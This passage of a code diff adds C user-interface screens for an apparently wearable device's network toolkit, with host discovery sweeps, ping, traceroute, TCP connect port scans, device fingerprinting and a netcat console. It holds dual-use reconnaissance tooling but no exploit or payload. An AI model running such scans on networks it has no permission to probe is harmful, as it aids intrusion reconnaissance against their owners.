+    lv_label_set_long_mode(l, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(l, lv_pct(100));
+    lv_label_set_text(l, text);
+    lv_obj_add_style(l, &nocsif_style_font_tag, 0);   /* mono 11/13/15 — scales with the type scale */
+    lv_obj_set_style_text_color(l, color, 0);
+    return row;
+}
+
+static lv_obj_t *build_nt_ping_result(void);   /* Ping runs on its own screen (no more toast + exit) */
+static void      nt_start_ping(uint32_t ip);
+
+/* ---- host-action modal (Scan / Ping this host) ---- */
+static void nt_popup_close(void) { if (s_nt_ov) { lv_obj_delete(s_nt_ov); s_nt_ov = NULL; } }
+static void nt_popup_dismiss_cb(lv_event_t *e) { (void)e; nt_popup_close(); }
+
+static void nt_popup_deep_cb(lv_event_t *e)
+{
+    (void)e;
+    uint32_t ip = s_nt_target;
+    nt_popup_close();
+    nocsif_nettools_request_deepdive(ip);
+    nocsif_nav_push(build_nt_device());
+}
+static void nt_popup_trace_cb(lv_event_t *e)
+{
+    (void)e;
+    uint32_t ip = s_nt_target;
+    nt_popup_close();
+    nocsif_nettools_request_traceroute(ip);
+    nocsif_nav_push(build_nt_trace());
+}
+static void nt_popup_ping_cb(lv_event_t *e)
+{
+    (void)e;
+    uint32_t ip = s_nt_target;
+    nt_popup_close();
+    nt_start_ping(ip);
+}
+
+static void nt_host_popup(uint32_t ip, const char *vendor, const char *name)
+{
+    if (s_nt_ov) return;
+    s_nt_target = ip;
+
+    lv_obj_t *ov = lv_obj_create(lv_layer_top());
+    lv_obj_remove_style_all(ov);
+    lv_obj_set_size(ov, lv_pct(100), lv_pct(100));
+    lv_obj_set_style_bg_color(ov, NOCSIF_VOID, 0);
+    lv_obj_set_style_bg_opa(ov, LV_OPA_70, 0);
+    lv_obj_set_flex_flow(ov, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(ov, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_add_flag(ov, LV_OBJ_FLAG_CLICKABLE);
+    lv_obj_clear_flag(ov, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_add_event_cb(ov, nt_popup_dismiss_cb, LV_EVENT_CLICKED, NULL);
+    s_nt_ov = ov;
+
+    lv_obj_t *card = lv_obj_create(ov);
+    lv_obj_remove_style_all(card);
+    lv_obj_set_width(card, 250);
+    lv_obj_set_height(card, LV_SIZE_CONTENT);
+    lv_obj_set_style_bg_color(card, lv_color_hex(0x161619), 0);
+    lv_obj_set_style_bg_opa(card, LV_OPA_COVER, 0);
+    lv_obj_set_style_radius(card, 14, 0);
+    lv_obj_set_style_border_width(card, 1, 0);
+    lv_obj_set_style_border_color(card, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_pad_all(card, 18, 0);
+    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(card, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_row(card, 10, 0);
+    lv_obj_add_flag(card, LV_OBJ_FLAG_CLICKABLE);
+    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+
+    char ips[16]; nocsif_nettools_ip_str(ip, ips, sizeof ips);
+    lv_obj_t *title = lv_label_create(card);
+    lv_label_set_text(title, ips);
+    nocsif_label_font_scaled(title, &nocsif_mono_18);
+    lv_obj_set_style_text_color(title, NOCSIF_BONE, 0);
+
+    if ((vendor && vendor[0]) || (name && name[0])) {
+        char sub[64];
+        snprintf(sub, sizeof sub, "%s%s%s", (name && name[0]) ? name : "",
+                 (name && name[0] && vendor && vendor[0]) ? "  " NOCSIF_DOT "  " : "",
+                 (vendor && vendor[0]) ? vendor : "");
+        lv_obj_t *sl = lv_label_create(card);
+        lv_label_set_text(sl, sub);
+        lv_obj_add_style(sl, &nocsif_style_font_tag_small, 0);
+        lv_obj_set_style_text_color(sl, NOCSIF_ASH, 0);
+    }
+
+    (void) nt_btn(card, "Deep-dive",  nt_popup_deep_cb);
+    (void) nt_btn(card, "Ping",       nt_popup_ping_cb);
+    (void) nt_btn(card, "Traceroute", nt_popup_trace_cb);
+}
+
+/* ---- hub ---- */
+static bool nt_link_guard(void)
+{
+    if (nocsif_wifi_connected()) return true;
+    nocsif_toast("Connect to a network first");
+    return false;
+}
+static void nt_hub_hosts_cb(lv_event_t *e)   { (void)e; if (nt_link_guard()) nocsif_nav_push(build_nt_hosts()); }
+static void nt_hub_scan_cb(lv_event_t *e)    /* "Scan a Host" = deep-dive */
+{
+    (void)e; if (!nt_link_guard()) return;
+    s_nt_entry_mode = 3; s_nt_entry_ports = NULL; s_nt_entry_n = 0;
+    nocsif_nav_push(build_nt_hostentry());
+}
+static void nt_hub_ping_cb(lv_event_t *e)
+{
+    (void)e; if (!nt_link_guard()) return;
+    s_nt_entry_mode = 0; s_nt_entry_ports = NULL; s_nt_entry_n = 0;
+    nocsif_nav_push(build_nt_hostentry());
+}
+static void nt_hub_trace_cb(lv_event_t *e)
+{
+    (void)e; if (!nt_link_guard()) return;
+    s_nt_entry_mode = 2; s_nt_entry_ports = NULL; s_nt_entry_n = 0;
+    nocsif_nav_push(build_nt_hostentry());
+}
+static void nt_hub_dns_cb(lv_event_t *e)     { (void)e; if (nt_link_guard()) nocsif_nav_push(build_nt_dns()); }
+static void nt_hub_disc_cb(lv_event_t *e)    { (void)e; if (nt_link_guard()) nocsif_nav_push(build_nt_discover()); }
+static void nt_hub_netcat_cb(lv_event_t *e)  { (void)e; if (nt_link_guard()) nocsif_nav_push(build_nt_netcat()); }
+static void nt_hub_http_cb(lv_event_t *e)    { (void)e; if (nt_link_guard()) nocsif_nav_push(build_nt_http()); }
+static void nt_hub_craft_cb(lv_event_t *e)   { (void)e; if (nt_link_guard()) nocsif_nav_push(build_nt_craft()); }
+static void nt_hub_portscan_cb(lv_event_t *e) { (void)e; if (nt_link_guard()) nocsif_nav_push(build_nt_presets(0)); }
+
+static lv_obj_t *build_wifi_nettools(void)
+{
+    nocsif_nettools_init();
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Network Tools", "on-LAN toolkit", &content);
+    lv_obj_t *list = nocsif_menu_list(content);
+
+    /* Top line: the network you're on (SSID) as the headline, with the watch IP + gateway beneath. */
+    uint32_t ip = 0, mask = 0, gw = 0;
+    bool linked = nocsif_nettools_link(&ip, &mask, &gw);
+
+    lv_obj_t *net = lv_label_create(list);
+    lv_label_set_long_mode(net, LV_LABEL_LONG_DOT);
+    lv_obj_set_width(net, lv_pct(100));
+    lv_obj_add_style(net, &nocsif_style_row_name, 0);
+    if (linked) {
+        const char *ssid = nocsif_wifi_saved_ssid();
+        lv_label_set_text(net, (ssid && ssid[0]) ? ssid : "connected");
+        lv_obj_set_style_text_color(net, NOCSIF_WHITE, 0);
+    } else {
+        lv_label_set_text(net, "not connected");
+        lv_obj_set_style_text_color(net, NOCSIF_GOLD, 0);
+    }
+
+    lv_obj_t *link = lv_label_create(list);
+    lv_label_set_long_mode(link, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(link, lv_pct(100));
+    lv_obj_add_style(link, &nocsif_style_font_caption, 0);
+    if (linked) {
+        char a[16], g[16];
+        nocsif_nettools_ip_str(ip, a, sizeof a);
+        nocsif_nettools_ip_str(gw, g, sizeof g);
+        char b[64]; snprintf(b, sizeof b, "%s " NOCSIF_DOT " gw %s", a, g);
+        lv_label_set_text(link, b);
+    } else {
+        lv_label_set_text(link, "join a network to enable these tools");
+    }
+    lv_obj_set_style_text_color(link, NOCSIF_STEEL, 0);
+    lv_obj_set_style_pad_bottom(link, 8, 0);
+
+    /* Alphabetical (no submenus here, all are leaf tool screens); "Discover Hosts" keeps its violet
+     * highlight as a natural "start here" accent since it also happens to sort first. */
+    wifi_menu_row(list, "Discover Hosts",    NOCSIF_VIOLET, ">", NULL, nt_hub_hosts_cb,   NULL);
+    wifi_menu_row(list, "DNS Lookup",        NOCSIF_BONE,   ">", NULL, nt_hub_dns_cb,     NULL);
+    wifi_menu_row(list, "HTTP Recon",        NOCSIF_BONE,   ">", NULL, nt_hub_http_cb,    NULL);
+    wifi_menu_row(list, "Netcat",            NOCSIF_BONE,   ">", NULL, nt_hub_netcat_cb,  NULL);
+    wifi_menu_row(list, "Packet Crafter",    NOCSIF_BONE,   ">", NULL, nt_hub_craft_cb,   NULL);
+    wifi_menu_row(list, "Ping a Host",       NOCSIF_BONE,   ">", NULL, nt_hub_ping_cb,    NULL);
+    wifi_menu_row(list, "Port Scan",         NOCSIF_BONE,   ">", NULL, nt_hub_portscan_cb, NULL);
+    wifi_menu_row(list, "Scan a Host",       NOCSIF_BONE,   ">", NULL, nt_hub_scan_cb,    NULL);
+    wifi_menu_row(list, "Service Discovery", NOCSIF_BONE,   ">", NULL, nt_hub_disc_cb,    NULL);
+    wifi_menu_row(list, "Traceroute",        NOCSIF_BONE,   ">", NULL, nt_hub_trace_cb,   NULL);
+
+    lv_obj_t *note = lv_label_create(list);
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_label_set_text(note,
+        "Sockets over your own link: discover, deep-dive a device (open ports + services + fingerprint), "
+        "DNS, traceroute, ping. Presets emulate nmap / masscan option sets, not the real tools. "
+        "Authorized testing only.");
+    lv_obj_add_style(note, &nocsif_style_font_tag_small, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_top(note, 14, 0);
+    return scr;
+}
+
+/* ---- Discover Hosts (ICMP sweep + enrichment) ---- */
+static lv_obj_t *s_nth_status, *s_nth_bar, *s_nth_list, *s_nth_start;
+static uint32_t  s_nth_gen_seen;
+
+static void nt_host_row_cb(lv_event_t *e)
+{
+    nocsif_nt_host_t h;
+    int idx = (int)(intptr_t)lv_event_get_user_data(e);
+    if (nocsif_nettools_host_get(idx, &h)) nt_host_popup(h.ip, h.vendor, h.name);
+}
+
+/* Rebuild the host rows from the current snapshot (called on a generation change). */
+static void nt_fill_hosts(void)
+{
+    if (!s_nth_list) return;
+    lv_obj_clean(s_nth_list);
+    int n = nocsif_nettools_host_count();
+    for (int i = 0; i < n; i++) {
+        nocsif_nt_host_t h;
+        if (!nocsif_nettools_host_get(i, &h)) continue;
+
+        lv_obj_t *row = lv_obj_create(s_nth_list);
+        lv_obj_remove_style_all(row);
+        lv_obj_set_width(row, lv_pct(100));
+        lv_obj_set_height(row, LV_SIZE_CONTENT);
+        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_COLUMN);
+        lv_obj_set_style_pad_ver(row, 7, 0);
+        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
+        lv_obj_add_flag(row, LV_OBJ_FLAG_GESTURE_BUBBLE);
+        lv_obj_add_style(row, &nocsif_style_row_press, LV_STATE_PRESSED);
+        lv_obj_add_event_cb(row, nt_host_row_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
+
+        char ips[16]; nocsif_nettools_ip_str(h.ip, ips, sizeof ips);
+        char top[40];
+        if (h.rtt_ms >= 0) snprintf(top, sizeof top, "%s  " NOCSIF_DOT " %d ms", ips, h.rtt_ms);
+        else               snprintf(top, sizeof top, "%s  " NOCSIF_DOT " arp", ips);
+        lv_obj_t *nl = lv_label_create(row);
+        lv_label_set_text(nl, top);
+        lv_obj_add_style(nl, &nocsif_style_row_name, 0);
+        lv_obj_set_style_text_color(nl, NOCSIF_BONE, 0);
+
+        char sub[80]; sub[0] = '\0';
+        int w = 0;
+        if (h.name[0])   w += snprintf(sub + w, sizeof sub - w, "%s", h.name);
+        if (h.vendor[0]) w += snprintf(sub + w, sizeof sub - w, "%s%s", w ? "  " NOCSIF_DOT "  " : "", h.vendor);
+        if (h.have_mac)  w += snprintf(sub + w, sizeof sub - w, "%s%02x:%02x:%02x:%02x:%02x:%02x",
+                                       w ? "  " NOCSIF_DOT "  " : "", h.mac[0], h.mac[1], h.mac[2], h.mac[3], h.mac[4], h.mac[5]);
+        if (sub[0]) {
+            lv_obj_t *sl = lv_label_create(row);
+            lv_label_set_long_mode(sl, LV_LABEL_LONG_WRAP);
+            lv_obj_set_width(sl, lv_pct(100));
+            lv_label_set_text(sl, sub);
+            lv_obj_add_style(sl, &nocsif_style_font_tag_small, 0);
+            lv_obj_set_style_text_color(sl, NOCSIF_STEEL, 0);
+        }
+    }
+}
+
+static void nt_hosts_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_nth_status) lv_label_set_text(s_nth_status, nocsif_nettools_status_str());
+    if (s_nth_bar)    lv_bar_set_value(s_nth_bar, nocsif_nettools_progress(), LV_ANIM_OFF);
+    if (s_nth_start) {
+        bool busy = nocsif_nettools_busy();
+        lv_label_set_text(s_nth_start, busy ? "Cancel" : "Re-sweep");
+        lv_obj_set_style_text_color(s_nth_start, busy ? NOCSIF_GOLD : NOCSIF_VIOLET, 0);
+    }
+    uint32_t g = nocsif_nettools_gen();
+    if (g != s_nth_gen_seen) { s_nth_gen_seen = g; nt_fill_hosts(); }
+}
+
+static void nt_hosts_start_cb(lv_event_t *e)
+{
+    (void)e;
+    if (nocsif_nettools_busy()) { nocsif_nettools_request_cancel(); return; }
+    nocsif_nettools_request_sweep();
+}
+static void nt_hosts_log_cb(lv_event_t *e) { (void)e; nocsif_nettools_request_log(); }
+
+static void nt_hosts_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    s_nth_status = s_nth_bar = s_nth_list = s_nth_start = NULL;
+}
+
+static lv_obj_t *build_nt_hosts(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Discover Hosts", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 24, 0);
+
+    s_nth_status = lv_label_create(content);
+    lv_label_set_long_mode(s_nth_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_nth_status, lv_pct(100));
+    lv_obj_add_style(s_nth_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_nth_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_nth_status, nocsif_nettools_status_str());
+
+    s_nth_bar = nt_progress_bar(content);
+
+    lv_obj_t *srow = wifi_menu_row(content, "Sweep the /24", NOCSIF_VIOLET, NULL, NULL, nt_hosts_start_cb, NULL);
+    s_nth_start = lv_obj_get_child(srow, 0);
+    wifi_menu_row(content, "Save results to SD", NOCSIF_BONE, ">", NULL, nt_hosts_log_cb, NULL);
+
+    s_nth_list = lv_obj_create(content);
+    lv_obj_remove_style_all(s_nth_list);
+    lv_obj_set_width(s_nth_list, lv_pct(100));
+    lv_obj_set_height(s_nth_list, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(s_nth_list, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(s_nth_list, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_style_pad_top(s_nth_list, 6, 0);
+
+    s_nth_gen_seen = nocsif_nettools_gen();
+    nt_fill_hosts();
+
+    /* Auto-start a sweep on entry when connected + idle (nothing to see otherwise). */
+    if (nocsif_wifi_connected() && !nocsif_nettools_busy()) nocsif_nettools_request_sweep();
+
+    lv_timer_t *timer = lv_timer_create(nt_hosts_tick, 500, NULL);
+    lv_obj_add_event_cb(scr, nt_hosts_deleted_cb, LV_EVENT_DELETE, timer);
+    return scr;
+}
+
+/* ---- Port-scan results ---- */
+static lv_obj_t *s_nts_status, *s_nts_bar, *s_nts_list;
+static uint32_t  s_nts_gen_seen;
+
+/* netcat setup state (shared by the setup screen, the console, and the tap-a-port shortcut). */
+static uint32_t s_nc_ui_ip;
+static char     s_nc_ui_ipstr[16];
+static uint16_t s_nc_ui_port = 80;
+static bool     s_nc_ui_udp;
+
+/* Tap an open port in a scan / deep-dive → open a netcat session straight to it. */
+static void nt_port_row_cb(lv_event_t *e)
+{
+    int port = (int)(intptr_t)lv_event_get_user_data(e);
+    uint32_t ip = nocsif_nettools_scan_target();
+    if (!ip || port <= 0) return;
+    s_nc_ui_ip = ip; nocsif_nettools_ip_str(ip, s_nc_ui_ipstr, sizeof s_nc_ui_ipstr);
+    s_nc_ui_port = (uint16_t)port; s_nc_ui_udp = false;
+    nocsif_nettools_nc_open(ip, (uint16_t)port, false);
+    nocsif_nav_push(build_nt_nc_console());
+}
+
+static void nt_fill_ports(lv_obj_t *list)
+{
+    if (!list) return;
+    lv_obj_clean(list);
+    int n = nocsif_nettools_port_count();
+    if (n == 0) {
+        lv_obj_t *empty = lv_label_create(list);
+        lv_label_set_text(empty, nocsif_nettools_busy() ? "scanning…" : "no open ports");
+        lv_obj_add_style(empty, &nocsif_style_font_caption, 0);
+        lv_obj_set_style_text_color(empty, NOCSIF_ASH, 0);
+        return;
+    }
+    for (int i = 0; i < n; i++) {
+        nocsif_nt_port_t p;
+        if (!nocsif_nettools_port_get(i, &p)) continue;
+        lv_obj_t *row = lv_obj_create(list);
+        lv_obj_remove_style_all(row);
+        lv_obj_set_width(row, lv_pct(100));
+        lv_obj_set_height(row, LV_SIZE_CONTENT);
+        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_COLUMN);
+        lv_obj_set_style_pad_ver(row, 8, 0);
+        lv_obj_set_style_border_side(row, LV_BORDER_SIDE_BOTTOM, 0);
+        lv_obj_set_style_border_width(row, 1, 0);
+        lv_obj_set_style_border_color(row, NOCSIF_EDGE, 0);
+        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);           /* tap → netcat to this port */
+        lv_obj_add_flag(row, LV_OBJ_FLAG_GESTURE_BUBBLE);
+        lv_obj_add_style(row, &nocsif_style_row_press, LV_STATE_PRESSED);
+        lv_obj_add_event_cb(row, nt_port_row_cb, LV_EVENT_CLICKED, (void *)(intptr_t)p.port);
+
+        char t[40];
+        if (p.service[0]) snprintf(t, sizeof t, "%u  %s", p.port, p.service);
+        else              snprintf(t, sizeof t, "%u  open", p.port);
+        lv_obj_t *nl = lv_label_create(row);
+        lv_label_set_text(nl, t);
+        lv_obj_add_style(nl, &nocsif_style_row_name, 0);
+        lv_obj_set_style_text_color(nl, NOCSIF_VIOLET, 0);
+        if (p.banner[0]) {
+            lv_obj_t *bl = lv_label_create(row);
+            lv_label_set_long_mode(bl, LV_LABEL_LONG_WRAP);
+            lv_obj_set_width(bl, lv_pct(100));
+            lv_label_set_text(bl, p.banner);
+            lv_obj_add_style(bl, &nocsif_style_font_tag_small, 0);
+            lv_obj_set_style_text_color(bl, NOCSIF_STEEL, 0);
+        }
+    }
+}
+
+static void nt_scan_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_nts_status) lv_label_set_text(s_nts_status, nocsif_nettools_status_str());
+    if (s_nts_bar)    lv_bar_set_value(s_nts_bar, nocsif_nettools_progress(), LV_ANIM_OFF);
+    uint32_t g = nocsif_nettools_gen();
+    if (g != s_nts_gen_seen) { s_nts_gen_seen = g; nt_fill_ports(s_nts_list); }
+}
+static void nt_scan_log_cb(lv_event_t *e) { (void)e; nocsif_nettools_request_log(); }
+static void nt_scan_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    s_nts_status = s_nts_bar = s_nts_list = NULL;
+}
+
+static lv_obj_t *build_nt_scan(void)
+{
+    char ips[16]; nocsif_nettools_ip_str(s_nt_target, ips, sizeof ips);
+    char sub[32]; snprintf(sub, sizeof sub, "target %s", ips);
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Port Scan", sub, &content);
+    lv_obj_set_style_pad_hor(content, 24, 0);
+
+    s_nts_status = lv_label_create(content);
+    lv_label_set_long_mode(s_nts_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_nts_status, lv_pct(100));
+    lv_obj_add_style(s_nts_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_nts_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_nts_status, nocsif_nettools_status_str());
+
+    s_nts_bar = nt_progress_bar(content);
+    wifi_menu_row(content, "Save results to SD", NOCSIF_BONE, ">", NULL, nt_scan_log_cb, NULL);
+
+    s_nts_list = lv_obj_create(content);
+    lv_obj_remove_style_all(s_nts_list);
+    lv_obj_set_width(s_nts_list, lv_pct(100));
+    lv_obj_set_height(s_nts_list, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(s_nts_list, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(s_nts_list, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_style_pad_top(s_nts_list, 6, 0);
+
+    s_nts_gen_seen = nocsif_nettools_gen();
+    nt_fill_ports(s_nts_list);
+
+    lv_timer_t *timer = lv_timer_create(nt_scan_tick, 400, NULL);
+    lv_obj_add_event_cb(scr, nt_scan_deleted_cb, LV_EVENT_DELETE, timer);
+    return scr;
+}
+
+/* ---- host entry (keyboard) ---- */
+static lv_obj_t *s_nt_entry_ta;
+static void nt_entry_go_cb(lv_event_t *e)
+{
+    (void)e;
+    if (!s_nt_entry_ta) return;
+    const char *txt = lv_textarea_get_text(s_nt_entry_ta);
+    uint32_t ip;
+    if (!nocsif_nettools_parse_ip(txt, &ip)) { nocsif_toast("Enter a valid IPv4 address"); return; }
+    s_nt_target = ip;
+    switch (s_nt_entry_mode) {
+    case 0:                                   /* ping — replace the entry with its own result screen */
+        nocsif_nav_back();
+        nt_start_ping(ip);
+        break;
+    case 1:                                   /* raw scan (preset ports) */
+        nocsif_nettools_request_scan(ip, s_nt_entry_ports, s_nt_entry_n, true);
+        nocsif_nav_push(build_nt_scan());
+        break;
+    case 2:                                   /* traceroute */
+        nocsif_nettools_request_traceroute(ip);
+        nocsif_nav_push(build_nt_trace());
+        break;
+    default:                                  /* 3 = deep-dive */
+        nocsif_nettools_request_deepdive(ip);
+        nocsif_nav_push(build_nt_device());
+        break;
+    }
+}
+
+static lv_obj_t *build_nt_hostentry(void)
+{
+    uint8_t m = s_nt_entry_mode;
+    const char *title = (m == 0) ? "Ping a Host" : (m == 2) ? "Traceroute" : (m == 1) ? "Scan a Host" : "Deep-dive";
+    const char *hintx = (m == 0) ? "Host to ping (IPv4)" : (m == 2) ? "Host to trace (IPv4)"
+                       : (m == 1) ? "Host to connect-scan (IPv4)" : "Host to deep-dive (IPv4)";
+    const char *btn   = (m == 0) ? "Ping" : (m == 2) ? "Trace" : (m == 1) ? "Scan" : "Deep-dive";
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold(title, NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+
+    lv_obj_t *hint = lv_label_create(content);
+    lv_label_set_text(hint, hintx);
+    lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+
+    lv_obj_t *ta = lv_textarea_create(content);
+    lv_textarea_set_one_line(ta, true);
+    lv_textarea_set_accepted_chars(ta, "0123456789.");
+    lv_textarea_set_max_length(ta, 15);
+    char seed[20]; nt_seed_prefix(seed, sizeof seed);
+    lv_textarea_set_text(ta, seed);
+    lv_obj_set_width(ta, lv_pct(100));
+    nocsif_label_font_scaled(ta, &nocsif_mono_18);
+    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
+    lv_obj_set_style_text_color(ta, NOCSIF_WHITE, 0);
+    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(ta, 1, 0);
+    s_nt_entry_ta = ta;
+
+    nt_action_btn(scr, btn, nt_entry_go_cb, NULL);
+    nocsif_kb_attach(scr, ta, NOCSIF_KB_NUMERIC);
+    return scr;
+}
+
+/* ---- Ping result screen — the ping runs in the worker; we poll its status line so the result stays
+ * ON its own screen (min / avg / max) instead of firing a toast and dropping back to the hub. ---- */
+static lv_obj_t *s_ntp_status, *s_ntp_bar;
+static uint32_t  s_ntp_target_ip;
+
+static void nt_ping_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_ntp_status) lv_label_set_text(s_ntp_status, nocsif_nettools_status_str());
+    if (s_ntp_bar)    lv_bar_set_value(s_ntp_bar, nocsif_nettools_progress(), LV_ANIM_OFF);
+}
+static void nt_ping_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    s_ntp_status = s_ntp_bar = NULL;
+}
+static lv_obj_t *build_nt_ping_result(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Ping", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 24, 0);
+
+    char ips[16]; nocsif_nettools_ip_str(s_ntp_target_ip, ips, sizeof ips);
+    lv_obj_t *tgt = lv_label_create(content);
+    lv_label_set_text(tgt, ips);
+    lv_obj_add_style(tgt, &nocsif_style_row_name, 0);
+    lv_obj_set_style_text_color(tgt, NOCSIF_WHITE, 0);
+
+    lv_obj_t *hint = lv_label_create(content);
+    lv_label_set_text(hint, "// icmp echo " NOCSIF_DOT " ok/sent " NOCSIF_DOT " min / avg / max ms");
+    lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+    lv_obj_set_style_pad_bottom(hint, 6, 0);
+
+    s_ntp_bar = nt_progress_bar(content);
+
+    s_ntp_status = lv_label_create(content);
+    lv_label_set_long_mode(s_ntp_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_ntp_status, lv_pct(100));
+    lv_obj_add_style(s_ntp_status, &nocsif_style_row_name, 0);
+    lv_obj_set_style_text_color(s_ntp_status, NOCSIF_BONE, 0);
+    lv_obj_set_style_pad_top(s_ntp_status, 8, 0);
+    lv_label_set_text(s_ntp_status, nocsif_nettools_status_str());
+
+    lv_timer_t *tmr = lv_timer_create(nt_ping_tick, 250, NULL);
+    lv_obj_add_event_cb(scr, nt_ping_deleted_cb, LV_EVENT_DELETE, tmr);
+    return scr;
+}
+static void nt_start_ping(uint32_t ip)
+{
+    s_ntp_target_ip = ip;
+    nocsif_nettools_request_ping(ip, 4);
+    nocsif_nav_push(build_nt_ping_result());
+}
+
+/* ---- Port Scan (curated connect-scan port sets) ---- */
+static void nt_preset_row_cb(lv_event_t *e)
+{
+    int idx = (int)(intptr_t)lv_event_get_user_data(e);
+    if (idx < 0 || idx >= (int)NT_N(k_nt_portscan)) return;
+    if (!nt_link_guard()) return;
+    const nt_preset_t *p = &k_nt_portscan[idx];
+    s_nt_entry_mode = 1; s_nt_entry_ports = p->ports; s_nt_entry_n = p->n;
+    nocsif_nav_push(build_nt_hostentry());
+}
+
+static lv_obj_t *build_nt_presets(int kind)
+{
+    (void)kind;   /* nmap/masscan merged into one Port Scan menu */
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Port Scan", "curated " NOCSIF_DOT " connect-scan", &content);
+    lv_obj_t *list = nocsif_menu_list(content);
+
+    lv_obj_t *note = lv_label_create(list);
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_label_set_text(note, "Pick a port set, then a host. Runs an on-watch TCP connect-scan of those ports.");
+    lv_obj_add_style(note, &nocsif_style_font_tag_small, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_bottom(note, 8, 0);
+
+    for (int i = 0; i < (int)NT_N(k_nt_portscan); i++) {
+        char acc[16]; snprintf(acc, sizeof acc, "%d ports", k_nt_portscan[i].n);
+        lv_obj_t *ac = NULL;
+        lv_obj_t *row = wifi_menu_row(list, k_nt_portscan[i].name, NOCSIF_BONE, acc, &ac, nt_preset_row_cb,
+                                      (void *)(intptr_t)i);
+        (void)row; (void)ac;
+    }
+    return scr;
+}
+
+/* ---- device deep-dive (fingerprint + ports + services) ---- */
+static lv_obj_t *s_ntd_fp, *s_ntd_status, *s_ntd_bar, *s_ntd_list;
+static uint32_t  s_ntd_gen_seen;
+
+static void nt_dev_fill_fp(void)
+{
+    if (!s_ntd_fp) return;
+    nocsif_nt_fp_t fp;
+    if (!nocsif_nettools_fp(&fp)) { lv_label_set_text(s_ntd_fp, "probing…"); return; }
+    char buf[288]; int w = 0;
+    if (fp.dev_type[0]) w += snprintf(buf + w, sizeof buf - w, "%s\n", fp.dev_type);
+    if (fp.name[0])     w += snprintf(buf + w, sizeof buf - w, "name  %s\n", fp.name);
+    if (fp.vendor[0])   w += snprintf(buf + w, sizeof buf - w, "vendor  %s\n", fp.vendor);
+    if (fp.have_mac)    w += snprintf(buf + w, sizeof buf - w, "mac  %02x:%02x:%02x:%02x:%02x:%02x\n",
+                                      fp.mac[0], fp.mac[1], fp.mac[2], fp.mac[3], fp.mac[4], fp.mac[5]);
+    w += snprintf(buf + w, sizeof buf - w, "%s", fp.os_guess[0] ? fp.os_guess : "os ?");
+    if (fp.rtt_ms >= 0) w += snprintf(buf + w, sizeof buf - w, " " NOCSIF_DOT " %d ms", fp.rtt_ms);
+    w += snprintf(buf + w, sizeof buf - w, " " NOCSIF_DOT " %d open", fp.open_ports);
+    lv_label_set_text(s_ntd_fp, buf);
+}
+
+static void nt_dev_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_ntd_status) lv_label_set_text(s_ntd_status, nocsif_nettools_status_str());
